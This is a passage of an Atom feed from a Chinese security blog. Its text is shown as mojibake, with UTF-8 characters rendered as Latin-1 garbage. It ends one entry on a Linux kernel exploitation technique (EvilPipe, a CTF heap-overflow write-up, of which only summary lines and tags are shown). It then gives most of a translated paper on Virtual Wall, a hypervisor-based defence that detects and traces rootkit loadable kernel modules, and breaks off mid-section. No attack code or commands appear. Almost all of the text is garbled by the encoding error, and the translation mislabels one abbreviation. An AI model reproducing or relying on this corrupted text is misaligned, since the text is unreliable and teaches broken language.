ï¼Œè¿™å±•ç¤ºäº†å…¶å¼ºå¤§çš„é€šç”¨æ€§ä¸æ˜“ç”¨æ€§ã€‚åŒæ—¶æˆ‘ä»¬å‘ç°äº†ä¸€äº›å¯èƒ½åº”ç”¨ç±»ä¼¼äº EvilPipe çš„é€»è¾‘æ”»å‡»æ‰‹æ³•çš„å†…æ ¸å¯¹è±¡ã€‚</li><li>æˆ‘ä»¬åˆ†æäº† Linux å†…æ ¸ç°æœ‰çš„é˜²å¾¡æœºåˆ¶åœ¨å¯¹æŠ—é€»è¾‘æ¼æ´ä¸Šçš„ä¸è¶³ï¼Œå¹¶æå‡ºäº†æ–°çš„ä¿æŠ¤æœºåˆ¶ã€‚æˆ‘ä»¬å¯¹è¿™é¡¹æ–°æœºåˆ¶è¿›è¡Œäº†è¯„ä¼°ï¼Œå‘ç°å…¶å¸¦æ¥çš„è´Ÿæ‹…æ˜¯å¯ä»¥å¿½ç•¥ä¸è®¡çš„ã€‚</li></ul></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ã€Œã•ã‚‰ã°ã€å…¨ã¦ã®ãƒªãƒŒã‚¯ã‚¹ ã‚«ãƒ¼ãƒãƒ« ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã€‚ã€&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="D^3CTF" scheme="https://arttnba3.github.io/tags/D-3CTF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="Cross-Cache Overflow" scheme="https://arttnba3.github.io/tags/Cross-Cache-Overflow/"/>
    
    <category term="Page-level Heap Fengshui" scheme="https://arttnba3.github.io/tags/Page-level-Heap-Fengshui/"/>
    
    <category term="å †é£æ°´" scheme="https://arttnba3.github.io/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x02ã€‘è®ºæ–‡ç¬”è®°ï¼šVirtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions </title>
    <link href="https://arttnba3.github.io/2023/04/14/PAPER-0X02_VTW/"/>
    <id>https://arttnba3.github.io/2023/04/14/PAPER-0X02_VTW/</id>
    <published>2023-04-13T15:46:35.000Z</published>
    <updated>2023-10-20T17:43:39.166Z</updated>
    
    <content type="html"><![CDATA[<p>ä»»ä½• rootkitï¼Œç»ˆå°†ç»³ä¹‹ä»¥æ³•ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…çš„æ¯•ä¸šè®¾è®¡å®Œæˆçš„è¦æ±‚ä¹‹ä¸€ä¾¿æ˜¯éœ€è¦å®Œæ•´ç¿»è¯‘ä¸€ç¯‡ä¸è¯¥é¢†åŸŸç›¸å…³çš„è®ºæ–‡ï¼Œåˆšå¥½ç¬”è€…åšçš„æ˜¯åç—…æ¯’ç›¸å…³çš„ï¼Œå› æ­¤å°±é€‰äº†<a href="https://ieeexplore.ieee.org/document/9186825">ã€ŠVirtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functionsã€‹</a>è¿™ç¯‡è®ºæ–‡</p><p>æœ¬ç¯‡åšå®¢è¯´æ˜¯è®ºæ–‡ç¬”è®°ï¼Œå…¶å®å°±æ˜¯<strong>ä¸€ç¯‡å®Œæ•´çš„è®ºæ–‡ç¿»è¯‘ï¼šï¼‰</strong></p><blockquote><p>ä¸è¿‡åœ¨ç¬”è€…ç¿»è¯‘å®Œä¹‹åæ‰å‘ç°ä½œè€…ä¼¼ä¹æ˜¯åäººï¼Œ<del>æ„Ÿè§‰æœ‰ç‚¹äºäº†ï¼Œæ¯•ç«Ÿä¸»è¦æ˜¯å‡ºäºç¿»è¯‘çš„ç›®çš„ï¼Œä½†æ˜¯å´æ²¡èƒ½ä½“ä¼šåˆ°åŸæ±åŸå‘³çš„ native speaker çš„è®ºæ–‡</del></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>å¦‚ä»Š Linux æœåŠ¡å™¨å·²è¢«åœ¨å‡ ä¹æ‰€æœ‰çš„äº‘ã€æ•°æ®ä¸­å¿ƒä¸è¶…çº§ç”µè„‘ä¸Šä½¿ç”¨ã€‚Linux å†…æ ¸åŠŸèƒ½æ­£é¢ä¸´ç€ä¸€ç§ç§°ä¹‹ä¸º <code>rootkits</code> çš„å¸¦æœ‰ root è®¿é—®æƒé™çš„æ¶æ„è½¯ä»¶æ”»å‡»ã€‚rootkits åœ¨å¦‚ä»Šçš„ Linux æœåŠ¡å™¨ä¸Šä»¥ <em>å¯è£…è½½å†…æ ¸æ¨¡å—</em> ï¼ˆLoadable Kernel Modulesï¼ŒLKMï¼‰çš„å½¢å¼å‡ºç°ã€‚è¿™äº›æ¨¡å—éšè—äºå…¶ä»–çš„å†…æ ¸å¯¹è±¡ä¹‹é—´ï¼Œä¸”å¯ä»¥é€šè¿‡ç¯¡æ”¹å†…æ ¸æœåŠ¡å‡½æ•°æ‰€éœ€çš„å…ƒæ•°æ®æ¥é‡å®šå‘å†…æ ¸æ§åˆ¶æµã€‚å†…æ ¸ rootkits åœ¨è½½å…¥åå¯¹ç”¨æˆ·æ˜¯ä¸å¯è§çš„ï¼Œè¿™å¯èƒ½ç»•è¿‡å¤§éƒ¨åˆ†çš„å®‰å…¨é˜²æŠ¤ã€‚rootkits åœ¨æ—¶é—´ä¸ç©ºé—´ä¸Šçš„è¡¨ç°éƒ½æ˜¯åˆ†æ•£çš„ï¼Œè¿™ä½¿å…¶å˜å¾—éš¾ä»¥è¢«å‘ç°æˆ–ç§»é™¤ã€‚ä¸ºäº†è§£å†³ rootkit çš„å¨èƒï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§é€šç”¨çš„ <em>è™šæ‹Ÿå¢™</em> ï¼ˆVirtual Wallï¼ŒVTWï¼‰æ–¹æ¡ˆä»¥é€šè¿‡è·Ÿè¸ªæ‰€å¸¦æ¥çš„å†…æ ¸æ´»åŠ¨æ¥è¿‡æ»¤å‡ºåµŒå…¥äº† rootkit çš„ LKMsã€‚è¿™ç§ VTW æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¸¦æœ‰ rootkit æ£€æµ‹ä¸æ—¶é—´è¿½è¸ªèƒ½åŠ›çš„è½»é‡çº§ hypervisorã€‚é€šå¸¸æƒ…å†µä¸‹ Linux åœ¨ Guest æ¨¡å¼ä¸‹è¿è¡Œï¼Œå½“ä¸€ä¸ª LKM çš„æ‰§è¡ŒæŸå®³äº† VTW æ‰€è®¾ç½®çš„å®‰å…¨ç­–ç•¥æ—¶ï¼ŒOS æ§åˆ¶æƒå°†è½¬æ¢åˆ° Host æ¨¡å¼ï¼Œåœ¨ Host æ¨¡å¼çš„ VTW åŠæ—¶åœ°å¯ç”¨æ£€æµ‹å¹¶è·Ÿè¸ª rootkit äº‹ä»¶ã€‚æ¢è¨€ä¹‹ï¼Œæ½œåœ¨çš„ rootkit æ”»å‡»ä¼šè¢«æ£€æµ‹ã€è¢«è¿½è¸ªå¹¶è¢«åˆ†ç±»ä»¥åšå‡ºæœ‰æ„ä¹‰çš„è¿‡æ»¤å†³ç­–ã€‚æ•´ä¸ªæ£€æµ‹ä¸è¿½è¸ªè¿‡ç¨‹åŸºäºå†…å­˜è®¿é—®æ§åˆ¶ä¸äº‹ä»¶æ³¨å…¥æœºåˆ¶ã€‚å®éªŒæ€§è´¨çš„ç»“æœå±•ç¤ºäº† VTW é˜²æŠ¤ç³»ç»Ÿåœ¨åŠæ—¶æ£€æµ‹ä¸é˜²å¾¡å†…æ ¸ rootkit ä¸Šæ˜¯é«˜æ•ˆçš„ï¼Œä¸”æ‰§è¡Œ VTW çš„ CPU å¼€é”€å°äº 2%ã€‚ç›¸è¾ƒäºå…¶ä»–çš„é˜²æŠ¤æœºåˆ¶ï¼ˆå¦‚ DIKernel ç­‰ï¼‰ï¼Œæˆ‘ä»¬çš„ vs æ›´å®¹æ˜“ä»¥ä½æ€§èƒ½å¼€é”€åº”ç”¨äº Linux æœåŠ¡å™¨ã€‚æˆ‘ä»¬è¿˜ä¼šå°†æˆ‘ä»¬çš„ç³»ç»Ÿä¸ä¸ƒä¸ªå…¶ä»–çš„ rootkit é˜²å¾¡ç³»ç»Ÿè¿›è¡Œå¯¹æ¯”ã€‚</p><p><strong>Index Terms</strong>â€”â€”è®¿é—®æ§åˆ¶ï¼Œæ•°æ®å®Œæ•´æ€§ï¼Œæ“ä½œç³»ç»Ÿå®‰å…¨ï¼Œå†…æ ¸ä¿æŠ¤ä¸ç³»ç»Ÿæ¶æ„ã€‚</p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>ç”±äºå†…æ ¸ rootkit çš„é«˜æƒé™ä¸å› æ­¤ç‰¹æ€§ï¼Œå…¶è¢«å¹¿æ³›åº”ç”¨äº Linux æœåŠ¡å™¨çš„å†…æ ¸æ”»å‡»ä¸­ã€‚å¦‚ä»Šå·²çŸ¥çš„å†…æ ¸ rootkits å¤§éƒ½ä»¥ <em>å¯è£…è½½å†…æ ¸æ¨¡å—</em> ï¼ˆLoadable Kernel Modulesï¼ŒLKMï¼‰çš„å½¢å¼å‡ºç°ï¼Œè¿™äº›æ¨¡å—å¯ä»¥é‡å®šä¹‰å†…æ ¸å†…å®¹å‡½æ•°ã€éšè—è‡ªèº«å¹¶éšè—ç›®æ ‡å¯¹è±¡ã€‚</p><p>å¯éšè—çš„ç‰¹æ€§å…è®¸å†…æ ¸ rootkit é€šè¿‡ â€œåŸºäº host çš„â€ æ¶æ„ç»•è¿‡å®‰å…¨å·¥å…·ã€‚è‡ªä»è¿™äº›å·¥å…·æ›´ä½çš„æƒé™é™åˆ¶äº†ä»–ä»¬çš„æ£€æµ‹èŒƒå›´ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ä»–ä»¬åŸºäº <em>ç›®æ ‡æ“ä½œç³»ç»Ÿ</em> ï¼ˆtarget operating systemï¼ŒTOSï¼‰ç¯å¢ƒï¼Œè¿™å¯¼è‡´æ£€æµ‹ç»“æœçš„å¯é æ€§å¿…é¡»åŸºäº TOS çš„å®Œå…¨å®‰å…¨ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå†…æ ¸ rootkit å¯ä»¥å·å·ç¯¡æ”¹ TOS ç¯å¢ƒä»¥ç ´åå…¶å®‰å…¨ã€‚</p><p>ä¸ºäº†å®ç°ä»–ä»¬çš„åŠŸèƒ½ï¼Œå†…æ ¸ rootkit éœ€è¦ç¯¡æ”¹å†…æ ¸å¯¹è±¡ã€‚å†…æ ¸ rootkit çš„æ“ä½œå¯¹è±¡åŒ…æ‹¬å¤šç§æ•°æ®ï¼Œä¾‹å¦‚æ§åˆ¶æ•°æ®ã€éæ§åˆ¶æ•°æ®ã€é™æ€æ•°æ®ä¸åŠ¨æ€æ•°æ®ã€‚ç†è®ºè€Œè¨€ï¼Œå†…æ ¸å®‰å…¨å¯ä»¥é€šè¿‡é™åˆ¶æ‰€æœ‰å¯¹æŒ‡å®šå†…æ ¸æ•°æ®çš„çªœæ”¹æ¥ç¡®ä¿ã€‚</p><p>ç„¶è€Œï¼Œä¸åŒçš„æ•°æ®é€šå¸¸åœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†æ•£å­˜å‚¨ï¼Œå¸¦æœ‰ä¸åŒç‰¹æ€§çš„æ•°æ®å¯èƒ½ä¼šå­˜æ”¾åœ¨åŒä¸€å¼ å†…å­˜é¡µä¸­ã€‚å› æ­¤ï¼ŒåŸºäºé¡µçš„ä¿æŠ¤æœºåˆ¶æ— æ³•åœ¨ä¸å½±å“å…¶ä»–å†…æ ¸æ•°æ®çš„æƒ…å†µä¸‹ä¿æŠ¤ç›®æ ‡æ•°æ®ã€‚</p><p>åœ¨æ”»å‡»ä¸­ï¼Œå†…æ ¸ rootkit éœ€è¦ç¯¡æ”¹çš„å†…æ ¸æ•°æ®é€šå¸¸ä»…æœ‰å‡ å­—èŠ‚ã€‚åŒæ—¶ï¼Œæœ€å°çš„å†…å­˜æƒé™ç®¡ç†ç²’åº¦ä¸ºä¸€å¼ é¡µï¼Œå…¶é€šå¸¸å ç”¨ 4KBã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ºäº†ä¿æŠ¤æ•°ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶æ‰€æœ‰å¯æ‰§è¡Œå®ä½“å¯¹ç›®æ ‡æ•°æ®æ‰€åœ¨é¡µçš„å†™æ“ä½œã€‚</p><p>åœ¨æ•°æ®å¤§å°ä¸ä¿æŠ¤ç²’åº¦é—´çš„ä¸åŒ¹é…ç ´åäº†å…¶ä»–å†…æ ¸å¯¹è±¡çš„åŸå§‹å±æ€§ï¼Œè¿™å½±å“äº†ç›¸å…³çš„æ‰§è¡Œå®ä½“çš„åŠŸèƒ½ä¸è¡¨ç°ã€‚ä¾‹å¦‚ï¼Œå†…æ ¸æ•°æ®ç»“æ„ä¸­çš„ VFS å‡½æ•°æŒ‡é’ˆæ¡ç›®é€šå¸¸ä¸ºå†…æ ¸ rootkit è¦ç¯¡æ”¹çš„ç›®æ ‡æ•°æ®ã€‚å°½ç®¡è¯¥æ¡ç›®å¹¶ä¸ä¼šè¢«åŠ¨æ€æ›´æ–°ï¼Œä¸å…¶å…±å€çš„çŠ¶æ€æè¿°æ¡ç›®å¯èƒ½ä¼šåœ¨æ‰§è¡Œå®ä½“è¿è¡Œæ—¶è¢«æ›´æ–°ã€‚è‹¥å¯¹çŠ¶æ€æè¿°çš„å†™æƒé™è¢«é™åˆ¶ï¼Œåˆ™å…³è”çš„æ‰§è¡Œæ¡ç›®å°†è¢«å½±å“ã€‚</p><p>å†…æ ¸ rootkit æœ‰ç€æ‰€æœ‰çš„ LKM ç‰¹æ€§ï¼Œä»–ä»¬å¯ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–è£…è½½ rootkit çš„å¯¼å‡ºå‡½æ•°ä»¥ç¯¡æ”¹å†…æ ¸æ•°æ®ã€‚ä»–ä»¬å¯ä»¥åœ¨è£…è½½æ—¶æˆ–æ˜¯åœ¨ä»–ä»¬ç”Ÿå‘½å‘¨æœŸçš„ä»»ä½•æ—¶åˆ»å¯åŠ¨ä¸€æ¬¡æ”»å‡»ã€‚å› æ­¤ï¼Œå†…æ ¸ rootkit å¯ä»¥æ˜¯ä»»ä½•å°†è¢«æˆ–å·²è¢«è£…è½½çš„ LKMï¼Œå‚ä¸åˆ°ä¸€æ¬¡æ”»å‡»çš„å†…æ ¸ rootkits ä¾¿å¯èƒ½æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª LKMsã€‚</p><p>ä»æ—¶é—´å±‚é¢ï¼Œå†…æ ¸ rootkit çš„æ”»å‡»æ—¶é—´æ˜¯éšæœºçš„ï¼›ä»ç©ºé—´å±‚é¢ï¼Œåœ¨ä¸€æ¬¡æ”»å‡»ä¸­çš„å‚ä¸è€…æ˜¯åˆ†æ•£çš„ã€‚è¿™ä¸¤ç§ç‰¹æ€§ä½¿å¾—å†…æ ¸ rootkit çš„æ”»å‡»äº‹ä»¶éš¾ä»¥é¢„æµ‹ã€æ”»å‡»çš„å‚ä¸è€…éš¾ä»¥è¿½è¸ªï¼Œè¿™æå¤§åœ°å½±å“äº†ç³»ç»Ÿå®‰å…¨ã€‚</p><p>æ”»å‡»å¼€å§‹æ—¶é—´çš„éšæœºæ€§ä½¿å¾—åŸºäºå•ä¸ªæˆ–å‘¨æœŸæ€§çš„æ£€æµ‹ä»…èƒ½è¾¾åˆ°æ—¶å€™æ£€æµ‹çš„æ•ˆæœã€‚å½“è¿™äº›æ–¹æ³•è¢«æ‰§è¡Œæ—¶ï¼Œå†…æ ¸ rootkits çš„æ”»å‡»å¯èƒ½å·²ç»å®Œæˆäº†ï¼Œç”šè‡³æ‰€æœ‰çš„ rootkits éƒ½å¯èƒ½è¢«ç§»é™¤äº†ã€‚ç»“æœä¾¿æ˜¯ï¼Œä»–ä»¬çš„æ£€æµ‹ä¸é˜²æŠ¤æ•ˆæœå°†è¢«æå¤§åœ°å½±å“ã€‚å†…æ ¸ rootkits é—´çš„ä¾èµ–å…³ç³»ä½¿å¾—æ”»å‡»çš„å½¢å¼æ›´åŠ å¤šæ ·åŒ–ã€‚</p><p>é€è¿‡ä¾èµ–å…³ç³»ï¼Œå†…æ ¸ rootkit å¯ä»¥è¿æ¥å¤šä¸ª LKMs ä»¥ç”¨ä½œå†…æ ¸æ”»å‡»ã€‚ç°æœ‰çš„å®‰å…¨æ–¹æ¡ˆä»…èƒ½æ£€æµ‹å½“å‰æ”»å‡»çš„ç›´æ¥å‘èµ·è€…ï¼Œä½†æ— æ³•è¯†åˆ«åœ¨æ•´ä¸ªæ”»å‡»è¿‡ç¨‹ä¸­çš„å…¶ä»–å‚ä¸è€…ã€‚æœªè¢«æ£€æµ‹çš„æ”»å‡»è€…å°†ä¸€ç›´æ½œä¼äºæ“ä½œç³»ç»Ÿä¸­ï¼Œç­‰å¾…æ¡ä»¶æˆç†Ÿæ—¶å†æ¬¡å‘èµ·æ”»å‡»ã€‚</p><p>æˆ‘ä»¬æå‡ºäº†ä¸€ç§å†…æ ¸ rootkit è¿‡æ»¤æ–¹æ³• VTW ä»¥ä¿æŠ¤å†…æ ¸åŠŸèƒ½ï¼Œä¾‹å¦‚ç³»ç»Ÿè°ƒç”¨è¡¨ã€å†…æ ¸åªè¯»å¯¹è±¡ã€LKM çŠ¶æ€æè¿°ç¬¦ã€<code>&quot;proc&quot;</code> æ–‡ä»¶å‡½æ•°æŒ‡é’ˆã€ç½‘ç»œæ–‡ä»¶æŒ‡é’ˆç­‰ã€‚è¿™ç§æ–¹æ³•ä½¿ç”¨ Intel VMX æŠ€æœ¯ä»¥å°†æ“ä½œç³»ç»Ÿåˆ†ä¸ºä¸¤ç§æ¨¡å¼ï¼šâ€œhostâ€ ä¸ â€œguestâ€ã€‚</p><p>è·¨è¿‡ä¸¤ç§æ‰§è¡Œæ¨¡å¼ï¼Œæˆ‘ä»¬ä¸ºå‹ç´§å†…æ ¸ rootkits åˆ›å»ºäº†æ£€æµ‹ã€é¢„é˜²ã€è·Ÿè¸ªç­–ç•¥ã€‚æœ¬è®ºæ–‡çš„ä¸»è¦è´¡çŒ®æ€»ç»“äºå¦‚ä¸‹å››ä¸ªæŠ€æœ¯å±‚é¢ï¼š</p><p>1ï¼‰ å»ºç«‹äº†ä¸€ä¸ªè½»é‡çº§çš„ hypervisorã€‚å…¶ä½¿ç”¨ Intel VMX æŠ€æœ¯æ¥é‡æ„ç³»ç»Ÿæ‰§è¡Œæ¨¡å¼ï¼Œä½¿å¾—å¯¹å†…æ ¸èµ„æºçš„è®¿é—®æ›´èƒ½è¢«æ£€æµ‹åˆ°ã€‚</p><p>2ï¼‰ å»ºç«‹äº†ä¸€ä¸ªèµ„æºè®¿é—®æ§åˆ¶æœºåˆ¶ã€‚å…¶å¯ä»¥æ„ŸçŸ¥å¯¹ç›®æ ‡å†…å­˜è®¿é—®çš„æ„ŸçŸ¥ã€é™åˆ¶ã€æ“æ§ï¼Œä¸”æ”¯æŒæˆ‘ä»¬åœ¨ â€œguestâ€ æ¨¡å¼ä¸‹ç›‘æ§ä¸æ§åˆ¶æ‰§è¡Œè·¯å¾„ã€‚</p><p>3ï¼‰ å»ºç«‹ä¸€ä¸ªæ§åˆ¶æµè·Ÿè¸ªæœºåˆ¶ã€‚è¯¥æœºåˆ¶æ”¯æŒè·Ÿè¸ªä¸åŒ LKMs çš„æ§åˆ¶æµè·³è½¬ä¸è¿”å›ã€‚</p><p>4ï¼‰ åˆ›å»ºäº†ä¸€ä¸ªæ£€æµ‹ã€é˜²æŠ¤ã€è·Ÿè¸ªå†…æ ¸ rootkits çš„å®‰å…¨æ¡†æ¶ã€‚é€šè¿‡ä¸Šè¿°æ¶æ„ä¸æœºåˆ¶ï¼Œå†…æ ¸ rootkits æ”»å‡»å¯ä»¥è¢«æ£€æµ‹ä¸é˜²æŠ¤ã€‚è¿™æ˜¯ç¬¬ä¸€æ¬¡æœ‰ä¸€ç§è·Ÿè¸ªå•æ¬¡æ”»å‡»ä¸­æ‰€æœ‰å‚ä¸çš„å†…æ ¸ rootkits çš„æ–¹æ³•è¢«å¼€å‘ã€‚</p><h1 id="2-Related-Previous-Work"><a href="#2-Related-Previous-Work" class="headerlink" title="2 Related Previous Work"></a>2 Related Previous Work</h1><p>ç”±äºå…¶è‰¯å¥½çš„æŠ—å¹²æ‰°èƒ½åŠ›ï¼ŒåŸºäºè™šæ‹ŸåŒ–çš„å†…æ ¸ä¿æŠ¤æ–¹æ³•å·²ç»å—åˆ°äº†é¢å¤–çš„å…³æ³¨ã€‚å°¤å…¶æ˜¯å¯¹å†…æ ¸ rootkits è€Œè¨€ï¼Œè¿™äº›æ–¹æ³•å±•ç¤ºäº†å‡ºè‰²çš„ä¼˜ç‚¹ã€‚ä»–ä»¬å¯ä»¥è¢«åˆ†ä¸ºä¸¤ç§ï¼šå…¥ä¾µå¼æ–¹æ³•ä¸éå…¥ä¾µå¼æ–¹æ³•ï¼Œå‰è€…éœ€è¦å‘ <em>ç›®æ ‡è™šæ‹Ÿæœº</em> ï¼ˆtarget virtual machineï¼ŒVTWï¼‰æ³¨å…¥é¢å¤–çš„å†…å®¹ä»¥è·å–æ‰€éœ€ä¿¡æ¯è€Œåè€…ä¸éœ€è¦ã€‚</p><p><em>ä¾µå…¥å¼æ–¹æ³•</em> ï¼ˆIntrusive Methodsï¼‰ã€‚ç”± Sebastion æœ€å…ˆæå‡ºçš„ X-TIER å°†ä¸€ä¸ªå†…æ ¸æ¨¡å—æ’å…¥åˆ°ç›®æ ‡è™šæ‹Ÿæœºï¼Œæ¥ä¸‹æ¥å…¶é€šè¿‡æ¨¡å—æ¥è¯»å– TVM æ•°æ®ç»“æ„ä»¥è·å–å…¶çŠ¶æ€ä¿¡æ¯ã€‚åœ¨è¿™ä¹‹å X-TIER é€šè¿‡ hypercall å°†æ‰€éœ€ä¿¡æ¯ä¼ é€’ç»™ hypervisorã€‚</p><p>SYRINGE ä½¿ç”¨å‡½æ•°è°ƒç”¨æ³¨å…¥æŠ€æœ¯æ¥åœ¨ TVM å¤–å¯ç”¨å¯¹ TVM å‡½æ•°çš„è°ƒç”¨ï¼Œä¸æ­¤åŒæ—¶å±€éƒ¨ç‰§ç¾ŠæŠ€æœ¯è¢«ç”¨äºæ£€æµ‹æ§åˆ¶æµå®Œæ•´æ€§ã€‚</p><p>Virtuoso ç»§ç»­ä»æ§åˆ¶é€»è¾‘çš„è§’åº¦è·å– TVM çŠ¶æ€ä¿¡æ¯ã€‚å…¶åœ¨ TVM ä¸­å¤šæ¬¡è¿è¡Œç¨‹åºå¹¶æå–ç›¸å…³æŒ‡ä»¤ä¸ç›¸å…³æ‰§è¡Œè·¯å¾„ï¼Œä¹‹åç”Ÿæˆå†…çœä»£ç æ‰€éœ€çš„è·¯å¾„è¢«ç¿»è¯‘ï¼Œæœ€å Virtuoso å°†æ‰€æœ‰çš„ä¿¡æ¯ç¿»è¯‘æˆå¯ä»¥åœ¨ TVM å¤–è¿›è¡Œè¯­ä¹‰é‡æ„çš„ä»£ç ã€‚</p><p>X-TIERã€SYRINGEã€Virtuoso é€šè¿‡åˆ†æç‰©ç†å†…å­˜å¹¶ä»¥å…¶ä½œä¸ºçœŸå®è§†è§’è€Œè·å¾—è¯­ä¹‰è§†è§’ã€‚ä»–ä»¬å¯ä»¥é€šè¿‡å¯¹æ¯”çœŸå®çš„è¯­ä¹‰è§†è§’ä¸ TVM çš„å†…éƒ¨è§†è§’æ¥æ‰¾åˆ°éšè—çš„å¯¹è±¡ï¼Œå¦‚è¿›ç¨‹ä¸æ–‡ä»¶ã€‚è‹¥å­˜åœ¨ä¸€ä¸ªéšè—å¯¹è±¡ï¼Œåˆ™ä»–ä»¬æ–­å®š TVM å·²ç»è¢«ç ´åè€Œä¸€ä¸ªå†…æ ¸ rootkit å¯èƒ½å­˜åœ¨äº TVM ä¸­ã€‚VMST åœ¨ rootkit æ£€æµ‹ä¸Šä½¿ç”¨åŒæ ·çš„æ–¹æ³•ã€‚</p><p><em>éå…¥ä¾µå¼æ–¹æ³•</em> ï¼ˆNon-Intrusive Methodsï¼‰ã€‚VMwatch çš„ç¬¬ä¸€æ­¥æ˜¯è·å– TVM çš„å†…å­˜ï¼Œä¹‹åä½¿ç”¨ TVM çš„å†…æ ¸æ•°æ®ç»“æ„ä½œä¸ºæ¨¡æ¿æ¥ç†è§£å†…å­˜æ‰€è¡¨ç¤ºçš„æ“ä½œæ€§çŠ¶æ€ã€‚</p><p>ä¸ VMwatcher ä¸åŒï¼ŒRTKDSM ä¸ºä¸€ä¸ªå®æ—¶ç³»ç»Ÿï¼Œå…¶å¯ä»¥è¢«åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šå†…çœä»£ç†ä¸ç›‘æ§ä»£ç†ï¼Œå‰è€…æ”¾ç½®åœ¨ä¸€ä¸ªå®‰å…¨çš„è™šæ‹Ÿæœºä¸­ï¼Œåè€…åˆ™æ”¾ç½®åœ¨ hypervisor ä¸­ã€‚RTKDSM å¯ä»¥é€šè¿‡äº¤å‰å¯¹æ¯”æ¥å¯¹æ•°æ®ç»“æ„è¿›è¡Œå®æ—¶ç›‘æ§ã€‚</p><p>ä¸Šè¿°æ–¹æ³•å¯ä»¥è¢«ç”¨ä»¥æ£€æµ‹è¢«å†…æ ¸ rootkits éšè—çš„å¯¹è±¡ï¼Œç„¶è€Œè¿™äº›æ–¹æ³•åŸºäºå¦‚ Xen çš„å·¨å‹è™šæ‹ŸåŒ–å¹³å°ï¼Œä¸”éœ€è¦å…‹æœè™šæ‹Ÿæœºå†…çœçš„è¯­ä¹‰ç¼ºé™·ã€‚ç»“æœä¾¿æ˜¯ï¼Œä»–ä»¬å‘æ“ä½œç³»ç»Ÿå¼•å…¥äº†ä¸€ä¸ªæ˜¾è‘—çš„æ€§èƒ½å¼€é”€ã€‚</p><p>ä¾‹å¦‚ï¼ŒRTKDSMé™ä½äº†ä¸€äº›åº”ç”¨ 110% çš„æ‰§è¡Œé€Ÿåº¦ã€‚SYRING åœ¨ç³»ç»Ÿè°ƒç”¨ä¸Šå»¶è¿Ÿåˆ° 51msï¼Œè¿™å¯¹ç³»ç»Ÿè°ƒç”¨è€Œè¨€æ˜¯ä¸€ä¸ªæ˜¾è‘—çš„æ€§èƒ½å¼€é”€ã€‚é™¤äº† RTKDSMï¼Œæ²¡æœ‰ä»»ä½•çš„ä¸Šè¿°æ–¹æ³•å¯ä»¥å®æ—¶ç›‘æ§ä¸æ£€æµ‹æ“ä½œç³»ç»Ÿã€‚</p><h1 id="3-Virtual-Wall-Architecture"><a href="#3-Virtual-Wall-Architecture" class="headerlink" title="3 Virtual Wall Architecture"></a>3 Virtual Wall Architecture</h1><p>VTW æ˜¯ä¸€ä¸ªå¸¦æœ‰å†…æ ¸ rootkit é˜²æŠ¤åŠŸèƒ½çš„è½»é‡çº§ hypervisorã€‚æœ¬èŠ‚æˆ‘ä»¬å°†ä»‹ç»å…¶æ€»ä½“æ¶æ„ã€‚</p><h2 id="3-1-Assumptions-and-Notational-Definition"><a href="#3-1-Assumptions-and-Notational-Definition" class="headerlink" title="3.1 Assumptions and Notational Definition"></a>3.1 Assumptions and Notational Definition</h2><p>æˆ‘ä»¬å‡è®¾æ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ª LKM æ³¨å…¥åˆ° TOS ä¸­ã€‚ç°å®ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åº”ç”¨æ¼æ´æé«˜æƒé™å¹¶é€šè¿‡åé—¨æ¥æ§åˆ¶ TOSï¼Œä¹‹åä¸€ä¸ª LKM å¯ä»¥è¢«æ³¨å…¥åˆ°å†…æ ¸ã€‚æˆ‘ä»¬åŒæ ·å‡è®¾ TOS ä¸éæ¶æ„æ‰§è¡Œå®ä½“ä¸ä¼šéæ³•ç¯¡æ”¹å†…æ ¸æ•°æ®ä¸å†…æ ¸æ§åˆ¶æµã€‚æ­¤å¤–ï¼Œæœ¬è®ºæ–‡æ‰€ç”¨å®šä¹‰å±•ç¤ºäºè¡¨ 1 ä¸­ã€‚</p><h2 id="3-2-Design-Objectives"><a href="#3-2-Design-Objectives" class="headerlink" title="3.2 Design Objectives"></a>3.2 Design Objectives</h2><p>VTW è¢«è®¾è®¡ä¸ºå¸¦æœ‰å¦‚ä¸‹æŒ‡å®šçš„ä¸‰ä¸ªæŠ€æœ¯éœ€æ±‚ï¼š</p><p>1ï¼‰ <em>å®æ—¶æ£€æµ‹</em> ï¼ˆReal-time Detectionï¼‰ã€‚å†…æ ¸ 